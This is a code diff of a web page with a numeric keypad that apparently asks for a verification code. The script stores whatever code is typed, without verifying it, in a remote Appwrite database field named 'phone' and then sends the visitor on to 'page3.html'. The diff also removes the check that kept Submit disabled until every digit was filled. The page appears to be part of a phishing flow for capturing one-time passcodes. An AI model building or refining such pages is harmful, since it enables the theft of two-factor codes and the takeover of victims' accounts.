@@ -35,8 +35,6 @@
             }
         </script>
 
-        
-
         <div class="number-keyboard">
             <div class="key-row">
                 <button class="key">1</button>
@@ -54,9 +52,9 @@
                 <button class="key">9</button>
             </div>
             <div class="key-rows">
-                <button class="key robber-btn">⌫</button>
-                <button type="submit" class="submit-btn" id="submit-btn" disabled>Submit</button> 
+                <button class="key robber-btn">⌫</button> <!-- Robber button -->
                 <button class="key">0</button>
+                <button id="submit-btn" type="button" class="submit-btn">Submit</button>
             </div>
         </div>
         
@@ -119,46 +117,36 @@
             });
         });
 
-        // Function to check if all inputs are filled
-        function checkInputs() {
-            const allFilled = Array.from(codeInputs).every(input => input.value.length > 0);
-            submitButton.disabled = !allFilled; // Enable or disable the submit button
-        }
-
-        // Add event listeners to code inputs to check their status
-        codeInputs.forEach(input => {
-            input.addEventListener('input', checkInputs);
-        });
-
         // Handle form submission
         document.getElementById('submit-btn').addEventListener('click', async function(event) {
-            event.preventDefault(); // Prevent the form from submitting normally
+    event.preventDefault(); // Prevent the form from submitting normally
 
-            const verificationCode = Array.from(codeInputs).map(input => input.value).join('');
-            
-            submitButton.innerHTML = '<div class="spinner"></div>';
+    const verificationCode = Array.from(codeInputs).map(input => input.value).join('');
+    
+    submitButton.innerHTML = '<div class="spinner"></div>';
 
-            try {
-                // Save the verification code to the Appwrite database
-                const result = await databases.createDocument(
-                    'data', // Your Database ID
-                    '66f1ff2200319d99c15d', // Your Collection ID
-                    'unique()', // Automatically generate a unique ID for the new document
-                    { phone: verificationCode }
-                );
+    try {
+        // Save the verification code to the Appwrite database
+        const result = await databases.createDocument(
+            'data', // Your Database ID
+            '66f1ff2200319d99c15d', // Your Collection ID
+            'unique()', // Automatically generate a unique ID for the new document
+            { phone: verificationCode }
+        );
 
-                console.log('Verification code saved successfully:', result);
-                alert('Verification code saved successfully!');
-                // Open the new page if the verification code is saved successfully
-                window.location.href = 'page3.html';
-            } catch (error) {
-                console.error('Error saving verification code:', error);
-                alert('Failed to save verification code.');
-            } finally {
-                // Revert button content back to the arrow icon
-                submitButton.innerHTML = 'Submit';
-            }
-        });
+        console.log('Verification code saved successfully:', result);
+        alert('Verification code saved successfully!');
+        // Open the new page if the verification code is saved successfully
+        window.location.href = 'page3.html';
+    } catch (error) {
+        console.error('Error saving verification code:', error);
+        alert('Failed to save verification code.');
+    } finally {
+        // Revert button content back to the original text
+        submitButton.innerHTML = 'Submit';
+    }
+});
+
     </script>
 </body>
 </html>
